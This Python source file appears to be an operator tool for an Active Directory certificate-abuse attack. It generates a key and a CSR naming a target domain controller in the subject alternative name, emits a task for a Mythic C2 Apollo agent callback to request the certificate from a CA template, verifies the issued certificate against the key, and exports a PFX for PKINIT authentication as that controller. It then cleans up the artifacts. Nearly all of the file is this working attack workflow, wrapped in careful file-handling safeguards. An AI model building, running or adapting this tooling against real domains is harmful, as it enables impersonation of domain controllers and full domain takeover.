#!/usr/bin/env python3
"""Local human-operator workflow for Certighost BOF preparation and extraction."""

from __future__ import annotations

import argparse
import hashlib
import hmac
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import Any, Sequence

from tools.certighost_mythic import (
    CertighostInputs,
    ValidationError,
    build_task_descriptor,
    parse_bof_output,
    validate_inputs,
    validate_task_descriptor,
)

MARKER_NAME = ".certighost-run.json"
MARKER_SCHEMA_VERSION = "certighost.operator.run/v1"
MARKER_TOOL = "certighost_operator"
DEFAULT_COFF_OBJECT = "build/certighost.x64.o"
DEFAULT_TIMEOUT_SECONDS = 30
DEFAULT_AGENT_VERSION = "operator-unspecified"

KEY_NAME = "target-dc.key.pem"
CSR_PEM_NAME = "target-dc.csr.pem"
CSR_DER_NAME = "target-dc.csr.der"
DESCRIPTOR_NAME = "task-descriptor.json"
MYTHIC_OUTPUT_NAME = "mythic-output.txt"
CERT_DER_NAME = "issued-cert.der"
CERT_PEM_NAME = "issued-cert.pem"
PFX_NAME = "issued-cert.pfx"
CERT_DER_TMP_NAME = ".issued-cert.der.tmp"
CERT_PEM_TMP_NAME = ".issued-cert.pem.tmp"
PFX_TMP_NAME = ".issued-cert.pfx.tmp"

KNOWN_GENERATED_FILES = (
    KEY_NAME,
    CSR_PEM_NAME,
    CSR_DER_NAME,
    DESCRIPTOR_NAME,
    MYTHIC_OUTPUT_NAME,
    CERT_DER_NAME,
    CERT_PEM_NAME,
    PFX_NAME,
    CERT_DER_TMP_NAME,
    CERT_PEM_TMP_NAME,
    PFX_TMP_NAME,
    MARKER_NAME,
)


class OperatorError(ValueError):
    """Raised when the local operator workflow cannot proceed safely."""


def _repository_root() -> Path:
    return Path(__file__).resolve().parents[1]


def _lexists(path: Path) -> bool:
    return os.path.lexists(str(path))


def _absolute_path(value: str | Path) -> Path:
    return Path(os.path.abspath(os.path.expanduser(str(value))))


def _reject_symlink_path(path: Path) -> None:
    if _lexists(path) and path.is_symlink():
        raise OperatorError(f"symlink path is not allowed: {path}")


def _refuse_unsafe_run_dir(path: Path) -> None:
    unsafe = {
        Path("/").resolve(),
        Path.home().resolve(),
        _repository_root().resolve(),
    }
    if path.resolve(strict=False) in unsafe:
        raise OperatorError(f"unsafe run directory is not allowed: {path}")


def _assert_regular_file(path: Path, label: str) -> None:
    _reject_symlink_path(path)
    if not _lexists(path):
        raise OperatorError(f"{label} does not exist: {path}")
    if not path.is_file():
        raise OperatorError(f"{label} must be a regular file: {path}")


def _assert_regular_or_missing(path: Path, label: str) -> None:
    _reject_symlink_path(path)
    if _lexists(path) and not path.is_file():
        raise OperatorError(f"{label} must be a regular file: {path}")


def _write_bytes_secure(path: Path, data: bytes, *, exclusive: bool = False) -> None:
    _assert_regular_or_missing(path, path.name)
    flags = os.O_WRONLY | os.O_CREAT
    flags |= os.O_EXCL if exclusive else os.O_TRUNC
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    try:
        fd = os.open(str(path), flags, 0o600)
    except OSError as exc:
        raise OperatorError(f"unable to write {path}: {exc}") from exc
    try:
        with os.fdopen(fd, "wb") as handle:
            handle.write(data)
            handle.flush()
            os.fsync(handle.fileno())
    except Exception:
        raise
    finally:
        if _lexists(path) and path.is_file():
            os.chmod(path, 0o600)


def _write_json_secure(path: Path, value: Any, *, exclusive: bool = False) -> None:
    payload = (json.dumps(value, indent=2, sort_keys=True) + "\n").encode("utf-8")
    _write_bytes_secure(path, payload, exclusive=exclusive)


def _read_regular_bytes(path: Path, label: str) -> bytes:
    _assert_regular_file(path, label)
    try:
        return path.read_bytes()
    except OSError as exc:
        raise OperatorError(f"unable to read {label}: {path}: {exc}") from exc


def _marker_payload(run_dir: Path) -> dict[str, str]:
    return {
        "schema_version": MARKER_SCHEMA_VERSION,
        "tool": MARKER_TOOL,
        "run_dir": str(run_dir),
        "run_dir_name": run_dir.name,
    }


def _load_marker(run_dir: Path) -> None:
    marker_path = run_dir / MARKER_NAME
    _assert_regular_file(marker_path, "Certighost run marker")
    try:
        marker = json.loads(marker_path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        raise OperatorError(f"invalid Certighost run marker: {marker_path}") from exc
    expected = _marker_payload(run_dir)
    if not isinstance(marker, dict) or any(marker.get(key) != value for key, value in expected.items()):
        raise OperatorError(f"directory is not the exact marked Certighost run directory: {run_dir}")


def _create_run_dir(value: str) -> Path:
    run_dir = _absolute_path(value)
    _reject_symlink_path(run_dir)
    _refuse_unsafe_run_dir(run_dir)
    if _lexists(run_dir):
        raise OperatorError(f"run directory already exists; choose a new explicit directory: {run_dir}")
    try:
        run_dir.mkdir(mode=0o700, parents=True, exist_ok=False)
    except OSError as exc:
        raise OperatorError(f"unable to create run directory {run_dir}: {exc}") from exc
    os.chmod(run_dir, 0o700)
    _reject_symlink_path(run_dir)
    run_dir = run_dir.resolve(strict=True)
    _refuse_unsafe_run_dir(run_dir)
    _write_json_secure(run_dir / MARKER_NAME, _marker_payload(run_dir), exclusive=True)
    return run_dir


def _require_marked_run_dir(value: str) -> Path:
    run_dir = _absolute_path(value)
    _reject_symlink_path(run_dir)
    _refuse_unsafe_run_dir(run_dir)
    if not _lexists(run_dir) or not run_dir.is_dir():
        raise OperatorError(f"run directory does not exist: {run_dir}")
    run_dir = run_dir.resolve(strict=True)
    _refuse_unsafe_run_dir(run_dir)
    _load_marker(run_dir)
    return run_dir


def _prompt_required(value: str | None, label: str) -> str:
    if value is not None and value.strip() != "":
        return value.strip()
    try:
        entered = input(f"{label}: ").strip()
    except EOFError as exc:
        raise OperatorError(f"{label} is required") from exc
    if entered == "":
        raise OperatorError(f"{label} is required")
    return entered


def _find_openssl() -> str:
    openssl = shutil.which("openssl")
    if openssl is None:
        raise OperatorError("openssl was not found in PATH")
    return openssl


def _run_openssl(openssl: str, args: Sequence[str], *, input_bytes: bytes | None = None) -> bytes:
    try:
        completed = subprocess.run(
            [openssl, *args],
            input=input_bytes,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
    except OSError as exc:
        raise OperatorError(f"unable to execute openssl: {exc}") from exc
    if completed.returncode != 0:
        stderr = completed.stderr.decode("utf-8", "replace").strip()
        detail = stderr.splitlines()[-1] if stderr else f"exit status {completed.returncode}"
        raise OperatorError(f"openssl {' '.join(args[:2])} failed: {detail}")
    return completed.stdout


def _validate_prepare_text(ca_config: str, template: str, target_dc: str, cdc: str) -> None:
    inputs = CertighostInputs.from_text(
        csr_der=b"\x30\x00",
        ca_config=ca_config,
        template=template,
        san_dns=target_dc,
        cdc=cdc,
        rmd=target_dc,
    )
    validate_inputs(inputs)


def _generate_key_and_csr(openssl: str, run_dir: Path, target_dc: str) -> tuple[Path, Path, Path]:
    key_path = run_dir / KEY_NAME
    csr_pem_path = run_dir / CSR_PEM_NAME
    csr_der_path = run_dir / CSR_DER_NAME
    for path in (key_path, csr_pem_path, csr_der_path):
        _assert_regular_or_missing(path, path.name)
        if _lexists(path):
            raise OperatorError(f"generated artifact already exists: {path}")
    old_umask = os.umask(0o077)
    try:
        _run_openssl(
            openssl,
            [
                "req",
                "-new",
                "-newkey",
                "rsa:2048",
                "-nodes",
                "-keyout",
                str(key_path),
                "-out",
                str(csr_pem_path),
                "-subj",
                f"/CN={target_dc}",
                "-addext",
                f"subjectAltName=DNS:{target_dc}",
            ],
        )
        _run_openssl(
            openssl,
            [
                "req",
                "-in",
                str(csr_pem_path),
                "-outform",
                "DER",
                "-out",
                str(csr_der_path),
            ],
        )
    finally:
        os.umask(old_umask)
    for path in (key_path, csr_pem_path, csr_der_path):
        _assert_regular_file(path, path.name)
        os.chmod(path, 0o600)
    return key_path, csr_pem_path, csr_der_path


def _spki_digest_from_key(openssl: str, key_path: Path) -> bytes:
    key_spki = _run_openssl(openssl, ["pkey", "-in", str(key_path), "-pubout", "-outform", "DER"])
    return _run_openssl(openssl, ["dgst", "-sha256", "-binary"], input_bytes=key_spki)


def _spki_digest_from_certificate(openssl: str, cert_pem_path: Path) -> bytes:
    cert_pubkey_pem = _run_openssl(openssl, ["x509", "-in", str(cert_pem_path), "-pubkey", "-noout"])
    cert_spki = _run_openssl(openssl, ["pkey", "-pubin", "-outform", "DER"], input_bytes=cert_pubkey_pem)
    return _run_openssl(openssl, ["dgst", "-sha256", "-binary"], input_bytes=cert_spki)


def _replace_regular_file(source: Path, destination: Path) -> None:
    _assert_regular_file(source, source.name)
    _assert_regular_or_missing(destination, destination.name)
    try:
        os.replace(source, destination)
    except OSError as exc:
        raise OperatorError(f"unable to install {destination.name}: {exc}") from exc
    os.chmod(destination, 0o600)


def _remove_regular_file(path: Path) -> None:
    if not _lexists(path):
        return
    _assert_regular_file(path, path.name)
    try:
        path.unlink()
    except OSError as exc:
        raise OperatorError(f"unable to remove {path}: {exc}") from exc


def _prepare(args: argparse.Namespace) -> int:
    callback_id = _prompt_required(args.callback_id, "Callback ID")
    ca_config = _prompt_required(args.ca_config, "CA config (host\\CAName)")
    template = _prompt_required(args.template, "Certificate template")
    target_dc = _prompt_required(args.target_dc, "Target DC FQDN")
    cdc = _prompt_required(args.cdc, "CDC/listener host")
    run_dir_value = _prompt_required(args.run_dir, "Run directory")
    if args.agent_version is None:
        agent_version = DEFAULT_AGENT_VERSION
    elif args.agent_version.strip() == "":
        raise OperatorError("Apollo agent version must not be empty when supplied")
    else:
        agent_version = args.agent_version.strip()
    _validate_prepare_text(ca_config, template, target_dc, cdc)

    coff_object = _absolute_path(args.coff_object)
    coff_bytes = _read_regular_bytes(coff_object, "COFF object")
    if not re.fullmatch(r"[A-Za-z0-9._-]+\.o", coff_object.name):
        raise OperatorError("COFF object basename must end in .o and contain only safe characters")
    openssl = _find_openssl()
    run_dir = _create_run_dir(run_dir_value)
    key_path, csr_pem_path, csr_der_path = _generate_key_and_csr(openssl, run_dir, target_dc)

    inputs = CertighostInputs.from_text(
        csr_der=_read_regular_bytes(csr_der_path, "DER CSR"),
        ca_config=ca_config,
        template=template,
        san_dns=target_dc,
        cdc=cdc,
        rmd=target_dc,
    )
    descriptor = build_task_descriptor(
        inputs=inputs,
        callback_id=callback_id,
        agent_version=agent_version,
        coff_name=coff_object.name,
        coff_sha256=hashlib.sha256(coff_bytes).hexdigest(),
        timeout_seconds=args.timeout,
    )
    validate_task_descriptor(descriptor)
    descriptor_path = run_dir / DESCRIPTOR_NAME
    _write_json_secure(descriptor_path, descriptor, exclusive=True)

    print(descriptor["operator_command"])
    print(f"SECRET private key (0600): {key_path}")
    print(f"SENSITIVE CSR PEM: {csr_pem_path}")
    print(f"SENSITIVE CSR DER: {csr_der_path}")
    print(f"SENSITIVE task descriptor: {descriptor_path}")
    print("NEXT: Review the descriptor, paste the command above into the authorized callback, save complete Mythic output, then run extract.")
    return 0


def _extract(args: argparse.Namespace) -> int:
    run_dir = _require_marked_run_dir(args.run_dir)
    openssl = _find_openssl()
    if args.pfx_password == "":
        raise OperatorError("PFX password must not be empty")
    key_path = run_dir / KEY_NAME
    _assert_regular_file(key_path, "private key")

    output_source = _absolute_path(args.mythic_output)
    output_bytes = _read_regular_bytes(output_source, "captured Mythic output")
    stored_output_path = run_dir / MYTHIC_OUTPUT_NAME
    _write_bytes_secure(stored_output_path, output_bytes)
    try:
        output_text = output_bytes.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise OperatorError("captured Mythic output must be UTF-8 text") from exc
    parsed = parse_bof_output(output_text)
    if parsed.kind != "issued" or parsed.certificate_der is None:
        if parsed.kind == "non_issued":
            raise OperatorError(
                f"certificate was not issued (disposition={parsed.disposition} request_id={parsed.request_id})"
            )
        detail = "; ".join(parsed.errors) if parsed.errors else "issued certificate result was not found"
        raise OperatorError(f"captured Mythic output is not a valid issued result: {detail}")

    cert_der_path = run_dir / CERT_DER_NAME
    cert_pem_path = run_dir / CERT_PEM_NAME
    pfx_path = run_dir / PFX_NAME
    cert_der_tmp_path = run_dir / CERT_DER_TMP_NAME
    cert_pem_tmp_path = run_dir / CERT_PEM_TMP_NAME
    pfx_tmp_path = run_dir / PFX_TMP_NAME
    for path in (cert_der_path, cert_pem_path, pfx_path, cert_der_tmp_path, cert_pem_tmp_path, pfx_tmp_path):
        _assert_regular_or_missing(path, path.name)
    if _lexists(cert_der_path) or _lexists(cert_pem_path) or _lexists(pfx_path):
        raise OperatorError("certificate artifacts already exist in the run directory; use a fresh run directory")

    try:
        _write_bytes_secure(cert_der_tmp_path, parsed.certificate_der)
        _run_openssl(
            openssl,
            ["x509", "-inform", "DER", "-in", str(cert_der_tmp_path), "-out", str(cert_pem_tmp_path)],
        )
        _assert_regular_file(cert_pem_tmp_path, cert_pem_tmp_path.name)
        os.chmod(cert_pem_tmp_path, 0o600)
        key_digest = _spki_digest_from_key(openssl, key_path)
        cert_digest = _spki_digest_from_certificate(openssl, cert_pem_tmp_path)
        if not hmac.compare_digest(key_digest, cert_digest):
            raise OperatorError("issued certificate public key does not match the run private key")
        _replace_regular_file(cert_der_tmp_path, cert_der_path)
        _replace_regular_file(cert_pem_tmp_path, cert_pem_path)
        if args.pfx_password is not None:
            _run_openssl(
                openssl,
                [
                    "pkcs12",
                    "-export",
                    "-inkey",
                    str(key_path),
                    "-in",
                    str(cert_pem_path),
                    "-out",
                    str(pfx_tmp_path),
                    "-passout",
                    "stdin",
                ],
                input_bytes=(args.pfx_password + "\n").encode("utf-8"),
            )
            _assert_regular_file(pfx_tmp_path, pfx_tmp_path.name)
            os.chmod(pfx_tmp_path, 0o600)
            _replace_regular_file(pfx_tmp_path, pfx_path)
    except Exception:
        for path in (cert_der_tmp_path, cert_pem_tmp_path, pfx_tmp_path):
            try:
                _remove_regular_file(path)
            except OperatorError:
                pass
        raise

    print(f"SENSITIVE captured Mythic output: {stored_output_path}")
    print(f"SENSITIVE issued certificate DER: {cert_der_path}")
    print(f"SENSITIVE issued certificate PEM: {cert_pem_path}")
    print("VERIFIED certificate/private-key continuity: OpenSSL SHA-256 SPKI digests match")
    if args.pfx_password is not None:
        print(f"SECRET transient PFX (0600): {pfx_path}")
    print("NEXT: Use only the transient local certificate material for the authorized PKINIT proof, then run cleanup.")
    return 0


def _cleanup(args: argparse.Namespace) -> int:
    run_dir = _require_marked_run_dir(args.run_dir)
    present_known: list[Path] = []
    unrelated: list[str] = []
    try:
        entries = sorted(run_dir.iterdir(), key=lambda entry: entry.name)
    except OSError as exc:
        raise OperatorError(f"unable to enumerate run directory {run_dir}: {exc}") from exc
    for entry in entries:
        if entry.is_symlink():
            raise OperatorError(f"symlink file is not allowed in a Certighost run directory: {entry}")
        if entry.name in KNOWN_GENERATED_FILES:
            if not entry.is_file():
                raise OperatorError(f"generated artifact is not a regular file: {entry}")
            present_known.append(entry)
        else:
            unrelated.append(entry.name + ("/" if entry.is_dir() else ""))
    cleanup_order = [name for name in KNOWN_GENERATED_FILES if name != MARKER_NAME] + [MARKER_NAME]
    removed: list[str] = []
    present_by_name = {path.name: path for path in present_known}
    for name in cleanup_order:
        path = present_by_name.get(name)
        if path is None:
            continue
        try:
            path.unlink()
        except OSError as exc:
            raise OperatorError(f"unable to remove generated artifact {path}: {exc}") from exc
        removed.append(name)
    if removed:
        for name in removed:
            print(f"removed: {name}")
    else:
        print("removed: none")
    if unrelated:
        for name in unrelated:
            print(f"preserved unrelated: {name}")
    else:
        print("preserved unrelated: none")
    return 0


def _positive_int(value: str) -> int:
    try:
        parsed = int(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("must be an integer") from exc
    if parsed <= 0:
        raise argparse.ArgumentTypeError("must be greater than zero")
    return parsed


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    subparsers = parser.add_subparsers(dest="command", required=True)

    prepare = subparsers.add_parser("prepare", help="create a marked run directory and emit one Apollo command")
    prepare.add_argument("--callback-id")
    prepare.add_argument("--ca-config", "--ca", dest="ca_config")
    prepare.add_argument("--template")
    prepare.add_argument("--target-dc", "--target-dc-fqdn", dest="target_dc")
    prepare.add_argument("--cdc", "--listener-host", dest="cdc")
    prepare.add_argument("--run-dir", "--run-directory", dest="run_dir")
    prepare.add_argument("--coff-object", "--object", dest="coff_object", default=DEFAULT_COFF_OBJECT)
    prepare.add_argument("--agent-version")
    prepare.add_argument("--timeout", type=_positive_int, default=DEFAULT_TIMEOUT_SECONDS)
    prepare.set_defaults(func=_prepare)

    extract = subparsers.add_parser("extract", help="store Mythic output and verify an issued certificate locally")
    extract.add_argument("--run-dir", "--run-directory", dest="run_dir", required=True)
    extract.add_argument("--mythic-output", "--output-file", "--captured-output", dest="mythic_output", required=True)
    extract.add_argument("--pfx-password")
    extract.set_defaults(func=_extract)

    cleanup = subparsers.add_parser("cleanup", help="remove only generated artifacts from a marked run directory")
    cleanup.add_argument("--run-dir", "--run-directory", dest="run_dir", required=True)
    cleanup.set_defaults(func=_cleanup)
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        return int(args.func(args))
    except (OSError, OperatorError, ValidationError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
